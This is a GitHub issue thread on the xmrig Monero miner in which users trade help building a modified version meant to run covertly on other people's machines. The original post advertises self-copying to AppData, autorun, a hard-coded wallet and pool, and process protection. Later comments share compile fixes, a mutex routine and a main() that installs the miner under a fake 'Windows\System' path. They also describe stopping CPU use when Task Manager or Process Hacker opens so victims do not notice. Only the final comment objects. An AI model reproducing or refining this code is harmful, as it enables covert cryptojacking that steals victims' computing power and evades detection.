---
title: '[SLOVED] Autorun, protect process and file, integrated params ...'
source_url: https://github.com/xmrig/xmrig/issues/400
author: RansomFuck
assignees: []
labels: []
created_at: '2018-02-12T20:40:07+00:00'
updated_at: '2019-03-17T10:34:26+00:00'
type: issue
status: closed
closed_at: '2018-11-05T07:12:20+00:00'
---

# Original Description
Copy file to appdata, integrated encrypted wallet and pool, autorun, protect process and file. And to many f*cked changes. You can find https://github.com/RansomFuck/xmrig - here.
I am sloved problem for many users, support me) If you want contact me leave BitMesseneger or Jabber or e-mail or Telegram

# Discussion History
## Meyer01 | 2018-02-13T07:43:36+00:00
Nice job! I have done the same things to my mod, but added the possibility to install and run as windows service and miner always work with idle priority. Also it using only half threads. 
Why you didn't add the network analysers watch, like wireshark?

## Zelecktor | 2018-02-13T14:51:22+00:00
@RansomFuck you should oppen issues on your repository. Have some questions
Thanks 👍 

## Gill1000 | 2018-02-13T15:21:24+00:00
I was looking for autorun feature...thanks ..and yes,we will support you :)

## Gill1000 | 2018-02-14T07:29:42+00:00
@RansomFuck  I got errors check my log ....I m using mingw both 32 &64 and getting same type of errors using there respected version libs.

GILL@GILL-PC MINGW64 /c/Users/GILL/Desktop/MODRIG-master/build
$ cmake .. -G "Unix Makefiles" -DUV_INCLUDE_DIR="C:\Users\GILL\Desktop\xmrig-dep                                                                                                               s-v2_1\gcc\libuv\x64\include"   -DUV_LIBRARY="C:\Users\GILL\Desktop\xmrig-deps-v                                                                                                               2_1\gcc\libuv\x64\lib\libuv.a"   -DMHD_INCLUDE_DIR="C:\Users\GILL\Desktop\xmrig-                                                                                                               deps-v2_1\gcc\libmicrohttpd\x64\include"  -DMHD_LIBRARY="C:\Users\GILL\Desktop\x                                                                                                               mrig-deps-v2_1\gcc\libmicrohttpd\x64\lib\libmicrohttpd.a"                                                                                                                                      
-- The C compiler identification is GNU 7.3.0
-- The CXX compiler identification is GNU 7.3.0
-- Check for working C compiler: D:/msys64/mingw64/bin/cc.exe
-- Check for working C compiler: D:/msys64/mingw64/bin/cc.exe -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Check for working CXX compiler: D:/msys64/mingw64/bin/c++.exe
-- Check for working CXX compiler: D:/msys64/mingw64/bin/c++.exe -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Found UV: C:/Users/GILL/Desktop/xmrig-deps-v2_1/gcc/libuv/x64/lib/libuv.a
-- Looking for syslog.h
-- Looking for syslog.h - not found
-- Found mhd: C:/Users/GILL/Desktop/xmrig-deps-v2_1/gcc/libmicrohttpd/x64/includ                                                                                                               e
-- Configuring done
-- Generating done
-- Build files have been written to: C:/Users/GILL/Desktop/MODRIG-master/build

GILL@GILL-PC MINGW64 /c/Users/GILL/Desktop/MODRIG-master/build
$ make
Scanning dependencies of target cpuid
[  2%] Building C object src/3rdparty/libcpuid/CMakeFiles/cpuid.dir/cpuid_main.c                                                                                                               .obj
[  4%] Building C object src/3rdparty/libcpuid/CMakeFiles/cpuid.dir/asm-bits.c.o                                                                                                               bj
[  6%] Building C object src/3rdparty/libcpuid/CMakeFiles/cpuid.dir/recog_amd.c.                                                                                                               obj
[  8%] Building C object src/3rdparty/libcpuid/CMakeFiles/cpuid.dir/recog_intel.                                                                                                               c.obj
[ 10%] Building C object src/3rdparty/libcpuid/CMakeFiles/cpuid.dir/libcpuid_uti                                                                                                               l.c.obj
[ 12%] Linking C static library libcpuid.a
[ 12%] Built target cpuid
Scanning dependencies of target xmrig
[ 14%] Building CXX object CMakeFiles/xmrig.dir/src/api/Api.cpp.obj
C:/Users/GILL/Desktop/MODRIG-master/src/api/Api.cpp: In static member function                                                                                                                 static char* Api::get(const char*, int*)':
C:/Users/GILL/Desktop/MODRIG-master/src/api/Api.cpp:8:47: warning: no return sta                                                                                                               tement in function returning non-void [-Wreturn-type]
 char *Api::get(const char *url, int *status){ }
                                               ^
[ 17%] Building CXX object CMakeFiles/xmrig.dir/src/api/ApiState.cpp.obj
[ 19%] Building CXX object CMakeFiles/xmrig.dir/src/api/NetworkState.cpp.obj
[ 21%] Building CXX object CMakeFiles/xmrig.dir/src/App.cpp.obj
C:/Users/GILL/Desktop/MODRIG-master/src/App.cpp: In destructor 'virtual App::~Ap                                                                                                               p()':
C:/Users/GILL/Desktop/MODRIG-master/src/App.cpp:51:12: warning: possible problem                                                                                                                detected in invocation of delete operator: [-Wdelete-incomplete]
     delete m_httpd;
            ^~~~~~~
C:/Users/GILL/Desktop/MODRIG-master/src/App.cpp:51:12: warning: invalid use of i                                                                                                               ncomplete type 'class Httpd'
In file included from C:/Users/GILL/Desktop/MODRIG-master/src/App.cpp:2:0:
C:/Users/GILL/Desktop/MODRIG-master/src/App.h:6:7: note: forward declaration of                                                                                                                'class Httpd'
 class Httpd;
       ^~~~~
C:/Users/GILL/Desktop/MODRIG-master/src/App.cpp:51:12: note: neither the destruc                                                                                                               tor nor the class-specific operator delete will be called, even if they are decl                                                                                                               ared when the class is defined
     delete m_httpd;
            ^~~~~~~
[ 23%] Building CXX object CMakeFiles/xmrig.dir/src/Console.cpp.obj
[ 25%] Building CXX object CMakeFiles/xmrig.dir/src/log/ConsoleLog.cpp.obj
C:/Users/GILL/Desktop/MODRIG-master/src/log/ConsoleLog.cpp: In member function                                                                                                                 bool ConsoleLog::isWritable() const':
C:/Users/GILL/Desktop/MODRIG-master/src/log/ConsoleLog.cpp:23:37: warning: no re                                                                                                               turn statement in function returning non-void [-Wreturn-type]
 bool ConsoleLog::isWritable() const{}
                                     ^
[ 27%] Building CXX object CMakeFiles/xmrig.dir/src/log/FileLog.cpp.obj
[ 29%] Building CXX object CMakeFiles/xmrig.dir/src/log/Log.cpp.obj
[ 31%] Building CXX object CMakeFiles/xmrig.dir/src/Mem.cpp.obj
[ 34%] Building CXX object CMakeFiles/xmrig.dir/src/net/Client.cpp.obj
[ 36%] Building CXX object CMakeFiles/xmrig.dir/src/net/Job.cpp.obj
[ 38%] Building CXX object CMakeFiles/xmrig.dir/src/net/Network.cpp.obj
[ 40%] Building CXX object CMakeFiles/xmrig.dir/src/net/strategies/DonateStrateg                                                                                                               y.cpp.obj
[ 42%] Building CXX object CMakeFiles/xmrig.dir/src/net/strategies/FailoverStrat                                                                                                               egy.cpp.obj
[ 44%] Building CXX object CMakeFiles/xmrig.dir/src/net/strategies/SinglePoolStr                                                                                                               ategy.cpp.obj
[ 46%] Building CXX object CMakeFiles/xmrig.dir/src/net/SubmitResult.cpp.obj
[ 48%] Building CXX object CMakeFiles/xmrig.dir/src/net/Url.cpp.obj
[ 51%] Building CXX object CMakeFiles/xmrig.dir/src/Options.cpp.obj
[ 53%] Building CXX object CMakeFiles/xmrig.dir/src/Platform.cpp.obj
[ 55%] Building CXX object CMakeFiles/xmrig.dir/src/Summary.cpp.obj
[ 57%] Building CXX object CMakeFiles/xmrig.dir/src/workers/DoubleWorker.cpp.obj
[ 59%] Building CXX object CMakeFiles/xmrig.dir/src/workers/Handle.cpp.obj
[ 61%] Building CXX object CMakeFiles/xmrig.dir/src/workers/Hashrate.cpp.obj
[ 63%] Building CXX object CMakeFiles/xmrig.dir/src/workers/SingleWorker.cpp.obj
[ 65%] Building CXX object CMakeFiles/xmrig.dir/src/workers/Worker.cpp.obj
[ 68%] Building CXX object CMakeFiles/xmrig.dir/src/workers/Workers.cpp.obj
[ 70%] Building CXX object CMakeFiles/xmrig.dir/src/xmrig.cpp.obj
C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:12:0: warning: "STRICT" redefi                                                                                                               ned
 #define STRICT

In file included from D:/msys64/mingw64/x86_64-w64-mingw32/include/windef.h:8:0,
                 from D:/msys64/mingw64/x86_64-w64-mingw32/include/windows.h:69,
                 from D:/msys64/mingw64/x86_64-w64-mingw32/include/winsock2.h:2                                                                                                                ,
                 from C:/Users/GILL/Desktop/xmrig-deps-v2_1/gcc/libuv/x64/includ                                                                                                               e/uv-win.h:32,
                 from C:/Users/GILL/Desktop/xmrig-deps-v2_1/gcc/libuv/x64/includ                                                                                                               e/uv.h:60,
                 from C:/Users/GILL/Desktop/MODRIG-master/src/App.h:3,
                 from C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:3:
D:/msys64/mingw64/x86_64-w64-mingw32/include/minwindef.h:11:0: note: this is the                                                                                                                location of the previous definition
 #define STRICT 1

C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:13:0: warning: ignoring #pragm                                                                                                               a comment  [-Wunknown-pragmas]
 #pragma comment(linker, "/MERGE:.data=.text")

C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:14:0: warning: ignoring #pragm                                                                                                               a comment  [-Wunknown-pragmas]
 #pragma comment(linker, "/MERGE:.rdata=.text")

C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:15:0: warning: ignoring #pragm                                                                                                               a comment  [-Wunknown-pragmas]
 #pragma comment(linker, "/SECTION:.text,EWR")

C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp: In function 'int Copy(TCHAR*,                                                                                                                TCHAR*, TCHAR*)':
C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:107:1: warning: no return stat                                                                                                               ement in function returning non-void [-Wreturn-type]
 }
 ^
C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp: In function 'int CheckMutex(                                                                                                                ':
C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:110:138: error: too many initi                                                                                                               alizers for 'WCHAR [] {aka wchar_t []}'
  WCHAR MUTEX[] = { L"T", L"r", L"u", L"m", L"M", L"a", L"k", L"e", L"A", L"m",                                                                                                                L"e", L"r", L"i", L"c", L"a", L"G", L"r", L"e", L"a", L"t"};
                                                                                                                                                                                                                                                         ^
C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp: In function 'char* WorkerID(                                                                                                                ':
C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:178:87: warning: passing NULL                                                                                                                to non-pointer argument 3 of 'WINBOOL GetVolumeInformationW(LPCWSTR, LPWSTR, DWO                                                                                                               RD, LPDWORD, LPDWORD, LPDWORD, LPWSTR, DWORD)' [-Wconversion-null]
  GetVolumeInformation(L"c:\\", NULL, NULL, &VolumeSerialNumber, NULL, NULL, NUL                                                                                                               L, NULL);
                                                                                                                                                                                                      ^
C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:178:87: warning: passing NULL                                                                                                                to non-pointer argument 8 of 'WINBOOL GetVolumeInformationW(LPCWSTR, LPWSTR, DWO                                                                                                               RD, LPDWORD, LPDWORD, LPDWORD, LPWSTR, DWORD)' [-Wconversion-null]
C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:180:42: warning: format '%d' e                                                                                                               xpects argument of type 'int', but argument 3 has type 'DWORD {aka long unsigned                                                                                                                int}' [-Wformat=]
  sprintf(procID, "%d", VolumeSerialNumber);
                                          ^
C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:179:7: warning: address of loc                                                                                                               al variable 'procID' returned [-Wreturn-local-addr]
  char procID[20];
       ^~~~~~
C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp: In function 'int CheckPath()'                                                                                                               :
C:/Users/GILL/Desktop/MODRIG-master/src/xmrig.cpp:173:1: warning: control reache                                                                                                               s end of non-void function [-Wreturn-type]
 }
 ^
make[2]: *** [CMakeFiles/xmrig.dir/build.make:714: CMakeFiles/xmrig.dir/src/xmri                                                                                                               g.cpp.obj] Error 1
make[1]: *** [CMakeFiles/Makefile2:68: CMakeFiles/xmrig.dir/all] Error 2
make: *** [Makefile:84: all] Error 2

GILL@GILL-PC MINGW64 /c/Users/GILL/Desktop/MODRIG-master/build


I have also tried in linux by copy all the unix.cpp files into source folder and also geting same errors in linux too..
maybe you tell your procedure for compiling,,
and about your opinion @xmrig ??

## Meyer01 | 2018-02-14T07:54:38+00:00
I got the same problem. Try xmrig.cpp:110 WCHAR MUTEX[] = { L"random text"};

## Cybertank | 2018-02-14T08:15:42+00:00
I have this error too. I try set WCHAR MUTEX[] = { L"random text"};
And then i have new error 

3> Cpu.cpp
3> H: \ MODRIG-master \ src \ Cpu.cpp (14): error C2511: int Cpu :: optimalThreadsCount (int, bool, int): overloaded member function not found in "Cpu"
3> h: \ modrig-master \ src \ Cpu.h (5): note: see the declaration "Cpu"

## Meyer01 | 2018-02-14T08:19:29+00:00
Use the original cpu.cpp and cpu.h from xmrig

## Cybertank | 2018-02-14T08:28:44+00:00
@Meyer01, original cpu.cpp and cpu.h from xmrig get another error
3> H: \ MODRIG-master \ src \ Options.cpp (99): error C2039: CPUs: is not a member of "Cpu"
3> h: \ modrig-master \ src \ Cpu.h (32): note: see the declaration "Cpu"
3> H: \ MODRIG-master \ src \ Options.cpp (99): error C3861: CPUs: identifier not found

and 
3> H: \ MODRIG-master \ src \ Cpu_win.cpp (4): error C2039: CPUs: is not a member of "Cpu"
3> h: \ modrig-master \ src \ Cpu.h (32): note: see the declaration "Cpu"
3> H: \ MODRIG-master \ src \ Cpu_win.cpp (15): error C2039: CPUs: is not a member of "Cpu"
3> h: \ modrig-master \ src \ Cpu.h (32): note: see the declaration "Cpu"

## Meyer01 | 2018-02-14T09:21:47+00:00
Looks like you are still using wrong cpu.cpp and .h... Are you using VS2015 or 2017? Try MSYS2

## Gill1000 | 2018-02-14T09:23:52+00:00
@Meyer01 did you got any errors..??

## Gill1000 | 2018-02-14T09:26:25+00:00
I m using msys2 

## Meyer01 | 2018-02-14T09:38:07+00:00
I've got error with cpu.cpp but it solved by using original one.
Если че, можно на русском, кому проще.

## Zelecktor | 2018-02-14T12:29:58+00:00
I tried on linux and got several errors, thats why i wanted to post it on his repository issues.

## Gill1000 | 2018-02-15T09:37:36+00:00
Umm.. good you have control ..in other words this is really amalware source code..and can you please mention which version of mvs you are using..???
And as  Meyer01 mention that it worked  by replacing cpu.cpp and cpu.h file ..i mean do we have to  replace the file with xmrig files???? @RansomF4ck

## OfSize | 2018-02-28T09:16:17+00:00
чет скомпилировал , алго крипронайт лайт сменил , функам поставил возвращать значения , и толку то
запускается , копируется в роуминг ,но не бенчит(

## Meyer01 | 2018-02-28T09:25:06+00:00
Вылетает или висит в процессах и не жрет ЦПУ?

## OfSize | 2018-02-28T09:25:53+00:00
не висит в процессах

## OfSize | 2018-02-28T09:34:59+00:00
Httpd::handler: должна возвращать значение	xmrig	
в такие надо же return 0; дописывать?
он ж все равно не нужен
 еще чет странные параметры в xmrig передает 
RmlsbGVlZQ== (Fileee)


## OfSize | 2018-03-01T11:27:35+00:00
все равно висит и ничего не делает,хотя отлично агрументы в m_options подхватил

## OfSize | 2018-03-01T11:30:46+00:00
может кто тыкнет носом?


## lamibb | 2018-03-09T20:45:11+00:00
@RansomFuck can you contact me on telegram @bajrlavish ?? 

## Gill1000 | 2018-03-10T10:14:12+00:00
I m still getting errors...Anyone has solved this.. I m using mingw,, i never use vs from started...... happygill1000@gmail.com
Help

## Zelecktor | 2018-03-11T00:42:37+00:00
I sent you an e-mail

## lamibb | 2018-03-12T09:10:51+00:00
I managed to Build the .exe but it doesnt hide in taskmgr I can still see it as "Windows System" as process with Monero logo. Does it have to do with the line that I changed to "LPCWSTR MUTEX = L"EOFpjfekfaeölfjaeölfkje"; ?? 

Other than that, the lines to put the pool url and wallet are confusing AF, why two lines each? 

Please some advise here. More than happy donate. Contact me on telegram @bajrlavish or brianbytyqi@gmail.com ?? 

## Jh0nW1cK | 2018-03-15T05:36:32+00:00
A good job, will you release version 2.5 for POW change?
Thank you

## Meyer01 | 2018-03-20T20:26:48+00:00
lamibb, process is not hiding in taskmgr. It only stop using CPU when you start taskmgr, processhacker or something else. 
For mutex would be better to add Global\\\ before. Like LPCWSTR MUTEX = L"Global\\\somethinghere" It prevent running multiple copies of program on PC by one or different users. 



## Gill1000 | 2018-03-21T04:55:39+00:00
I m too looking for this mutex feature and i m failed in correcting this code...anyone have solve this issue..???? Plz mention here how..!

## Meyer01 | 2018-03-21T06:48:48+00:00
Gill1000 Mutex is working fine. Add double slash \\\ after Global. I fixed my previous post. 

## Gill1000 | 2018-03-21T11:58:39+00:00
@Meyer01  i m still little bit confused ,,can you please paste the mutex code here.
thanks

## Meyer01 | 2018-03-21T12:04:55+00:00
int CheckMutex()
 {
	WCHAR MUTEX[] = { L"Global\\\Lalalala"};
	HANDLE hMutex = CreateMutexW(0, 0, MUTEX);
	if ((GetLastError() == ERROR_ALREADY_EXISTS) || (GetLastError() == ERROR_ACCESS_DENIED)) 
             {
		CloseHandle(hMutex);
		std::exit(0);
              }
	return 0;
}

## Gill1000 | 2018-04-07T14:47:35+00:00
@Meyer01    for me this is not working..
here is my code
 int CheckMutex()
{
WCHAR MUTEX[] = { L"Global\\System"};
HANDLE hMutex = CreateMutexW(0, 0, MUTEX);
if ((GetLastError() == ERROR_ALREADY_EXISTS) || (GetLastError() == ERROR_ACCESS_DENIED))
{
CloseHandle(hMutex);
std::exit(0);
}
return 0;
}
 
 
int main(int argc, char **argv) {
    AutoRun(L"C:\\ProgramData\\Windows\\System", IsElevated());
    App app(argc, argv);

    return app.exec();
}


I have named my binary " System ".
my binary executes for second time!!!!!!!!!!
is there another file which i have to changed too..???
plz need help


## Meyer01 | 2018-04-07T20:32:06+00:00
I think you forget to call function CheckMutex() in main.
Try:
int main(int argc, char **argv) {
CheckMutex();
AutoRun(L"C:\ProgramData\Windows\System", IsElevated());
App app(argc, argv);

## Gill1000 | 2018-04-08T02:05:55+00:00
It works brother...really thanks..
appreciate your help brother :+1: 
:)

## PQFitz | 2019-03-14T17:05:02+00:00
ok


## trasherdk | 2019-03-17T10:34:25+00:00
So, you are discussing how to turn xmrig into malware. Not cool.

# Action History
- Created by: RansomFuck | 2018-02-12T20:40:07+00:00
- Closed at: 2018-11-05T07:12:20+00:00
